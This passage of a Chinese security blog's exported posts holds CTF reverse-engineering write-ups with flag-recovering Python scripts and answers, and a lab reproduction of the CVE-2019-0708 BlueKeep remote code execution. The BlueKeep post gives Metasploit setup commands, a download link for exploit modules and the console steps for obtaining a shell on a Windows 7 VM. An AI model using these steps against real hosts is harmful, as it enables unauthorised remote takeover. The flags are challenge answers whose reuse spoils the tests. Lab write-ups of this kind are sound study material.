crackme\n\n文件为exe文件，通过题目名推测考察脱壳技术，拖入PEID中查壳\n\n![nwSdj1.png](https://s2.ax1x.com/2019/09/11/nwSdj1.png)\n\n发现为北斗壳，没有什么脱壳经验便百度了一下OD手动脱壳的方法，原文连接如下\n\n- <https://blog.csdn.net/u011672712/article/details/52091989>\n\n载入OD![nwSBB6.png](https://s2.ax1x.com/2019/09/11/nwSBB6.png)\n\nF8运行到第一个call指令，此时ESP和EIP都是红色，下硬件访问断点，然后Shift+F9，运行到ESP落脚点，然后继续F8运行\n\n![nwSyND.png](https://s2.ax1x.com/2019/09/11/nwSyND.png)\n\n![nwS5Hf.png](https://s2.ax1x.com/2019/09/11/nwS5Hf.png)\n\n之后便来到了程序真正入口点，选择这条汇编右键脱壳\n\n![nwS74g.png](https://s2.ax1x.com/2019/09/11/nwS74g.png)\n\n![nwpZb6.png](https://s2.ax1x.com/2019/09/11/nwpZb6.png)\n\n即可得到脱壳后文件，可载入ida查看伪码\n\n![nwpMPe.png](https://s2.ax1x.com/2019/09/11/nwpMPe.png)\n\n红框部分便为加密算法\n\n![nwpl2d.png](https://s2.ax1x.com/2019/09/11/nwpl2d.png)\n\nPayload:\n\n```python\na = [0x12,0x4,0x8,0x14,0x24,0x5C,0x4A,0x3D,0x56,0x0A,0x10,0x67,0x0,0x41,0x0,0x1,0x46,0x5A,0x44,0x42,0x6E,0x0C,0x44,0x72,0x0C,0x0D,0x40,0x3E,0x4B,0x5F,0x2,0x1,0x4C,0x5E,0x5B,0x17,0x6E,0x0C,0x16,0x68,0x5B,0x12]\nb = \"this_is_not_flag\"\nb_list = list(b)\ni = 0\nflag = ''\n\nwhile i < 42:\n    j = i % 16\n    flag += chr(a[i] ^ ord(b_list[j]))\n    i += 1\n\nprint(flag)\n```\n\n得flag：flag{59b8ed8f-af22-11e7-bb4a-3cf862d1ee75}\n\n\n\n## 0x05 re2-cpp-is-awesome\n\nELF文件Linux下运行![nwp8KI.png](https://s2.ax1x.com/2019/09/11/nwp8KI.png)\n\n推测运行命令后输入正确flag，载入ida![nwpGrt.png](https://s2.ax1x.com/2019/09/11/nwpGrt.png)\n\n对应运行结果，运行命令后未接参数会提示输入flag\n\n![nwpUIS.png](https://s2.ax1x.com/2019/09/11/nwpUIS.png)\n\n跟进sub_400B56函数\n\n![nwpwGQ.png](https://s2.ax1x.com/2019/09/11/nwpwGQ.png)\n\n出现输入失败时的字符串，推测红框内为加密算法，提取相应数据\n\n![1566634949439](C:\\Users\\12424\\AppData\\Roaming\\Typora\\typora-user-images\\1566634949439.png)\n\n![nwp02j.png](https://s2.ax1x.com/2019/09/11/nwp02j.png)\n\nPayload：\n\n```python\nindex = [0x24,0x00,0x05,0x36,0x65,0x07,0x27,0x26,0x2D,0x01,0x03,0x00,0x0D,0x56,0x01,0x03,0x65,0x03,0x2D,0x16,0x02,0x15,0x03,0x65,0x00,0x29,0x44,0x44,0x01,0x44,0x2B,]\na = \"L3t_ME_T3ll_Y0u_S0m3th1ng_1mp0rtant_A_{FL4G}_W0nt_b3_3X4ctly_th4t_345y_t0_c4ptur3_H0wev3r_1T_w1ll_b3_C00l_1F_Y0u_g0t_1t\"\n\nfor i in index:\n    print(a[i], end='')\n```\n\nflag: ALEXCTF{W3_L0v3_C_W1th_CL45535}\n\n\n\n## 0x06 Key\n\n.exe文件，拖入PEID，无壳\n\n![nwpyq0.png](https://s2.ax1x.com/2019/09/11/nwpyq0.png)\n\n直接打开.exe文件一闪而过，用od运行出现\n\n![nwpcZV.png](https://s2.ax1x.com/2019/09/11/nwpcZV.png)\n\n载入ida32查看，发现相关字符串出现\n\n![nwpgaT.png](https://s2.ax1x.com/2019/09/11/nwpgaT.png)\n\n跟进if语句上面的sub_321620()函数，发现一串奇怪的路径\n\n![nwpfG4.png](https://s2.ax1x.com/2019/09/11/nwpfG4.png)\n\n创建此路径，并输入asd123456保存，再次运行\n\n![nwpos1.png](https://s2.ax1x.com/2019/09/11/nwpos1.png)\n\n推测程序从此文件读取输入进行字符串匹配\n\nOD断点到main函数位置，F7跟入，到关键比较的位置下断点\n\n![nwpHZ6.png](https://s2.ax1x.com/2019/09/11/nwpHZ6.png)\n\n可以发现对比串：idg_cni~bjbfi|gsxb，将其输入flag.txt文件中再次运行程序，得到正确输出判断为flag\n\n![nwpOiD.png](https://s2.ax1x.com/2019/09/11/nwpOiD.png)\n\n提交成功flag ：idg_cni~bjbfi|gsxb","tags":["Writeups"]},{"title":"CVE-2019-0708远程桌面代码执行漏洞复现","url":"/2019/09/08/20190708漏洞复现/","content":"\n## CVE-2019-0708远程桌面代码执行漏洞复现\n\n### 漏洞环境\n\n使用VMware Workstations安装Windows7 SP1模拟受害机\n\nWindows7 SP1下载链如下，可复制到迅雷直接下载\n\n`ed2k://|file|cn_windows_7_ultimate_with_sp1_x64_dvd_u_677408.iso|3420557312|B58548681854236C7939003B583A8078|/`\n\n[![n8piL9.png](https://s2.ax1x.com/2019/09/08/n8piL9.png)](https://imgchr.com/i/n8piL9)\n\nPS：需开启远程桌面连接，否则连接时会失败\n\n[![n8CIG6.md.png](https://s2.ax1x.com/2019/09/08/n8CIG6.md.png)](https://imgchr.com/i/n8CIG6)\n\n### EXPLOIT\n\n#### 攻击工具\n\n- 在kali环境使用以下命令安装最新版metasploit-framework\n\n```\ncurl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb > msfinstall && chmod 755 msfinstall && ./msfinstall\n```\n\n如果出现以下情况，则需要杀死apt相关进程，再次执行以上命令\n\n```\nE: 无法获得锁 /var/lib/dpkg/lock-frontend - open (11: 资源暂时不可用)\nE: Unable to acquire the dpkg frontend lock (/var/lib/dpkg/lock-frontend), is another process using it?\n```\n\n- 下载攻击套件放置文件到msf的相应文件夹(如果已存在同名文件,直接覆盖即可)\n\n<https://pan.baidu.com/s/1LqRqH3Vagw4Cane83zgKRA>   提取码：**ayqx**\n\n```\nrdp.rb   ->   /opt/metasploit-framework/embedded/framework/lib/msf/core/exploit/rdp.rb\n\nrdp_scanner.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/rdp_scanner.rb\n\ncve_2019_0708_bluekeep.rb   ->   /opt/metasploit-framework/embedded/framework/modules/auxiliary/scanner/rdp/cve_2019_0708_bluekeep.rb\n\ncve_2019_0708_bluekeep_rce.rb   ->   /opt/metasploit-framework/embedded/framework/modules/exploits/windows/rdp/cve_2019_0708_bluekeep_rce.rb\n```\n\n#### msf攻击命令\n\n键入``msfconsole`载入metasploit-framework\n\n再用`reload_all`重载漏洞利用模块\n\n键入`use exploit/windows/rdp/cve_2019_0708_bluekeep_rce`启用0708RDP模块\n\n用`info`查看模块相关信息及设置\n\n[![n89h38.png](https://s2.ax1x.com/2019/09/08/n89h38.png)](https://imgchr.com/i/n89h38)\n\n用如下命令分别设置相关参数\n\n```shell\nset RHOSTS 192.168.109.146  //受害主机ID\nset RPORT 3389\t\t\t\t//受害主机端口号，此漏洞一般为3389\nset target 3\t\t\t\t//使用VMware满足target3\n```\n\n然后`exploit`开启攻击等待建立连接\n\n[![n8Cubd.md.png](https://s2.ax1x.com/2019/09/08/n8Cubd.md.png)](https://imgchr.com/i/n8Cubd)\n\n建立连接以后,使用`shell`获得shell,再使用`python`获得交互式shell\n\n[![n8CNrQ.md.png](https://s2.ax1x.com/2019/09/08/n8CNrQ.md.png)](https://imgchr.com/i/n8CNrQ)\n\n攻击完成，拿到受害主机权限，并可以对受害机进行操作\n\n[![n8C2qJ.md.png](https://s2.ax1x.com/2019/09/08/n8C2qJ.md.png)](https://imgchr.com/i/n8C2qJ)\n\n","tags":["漏洞"]},{"title":"Bonjour！First blog","url":"/2019/09/06/Firstblog/","content":"### In memory of myself\nThis is my first blog.\nThanks\n\n"}]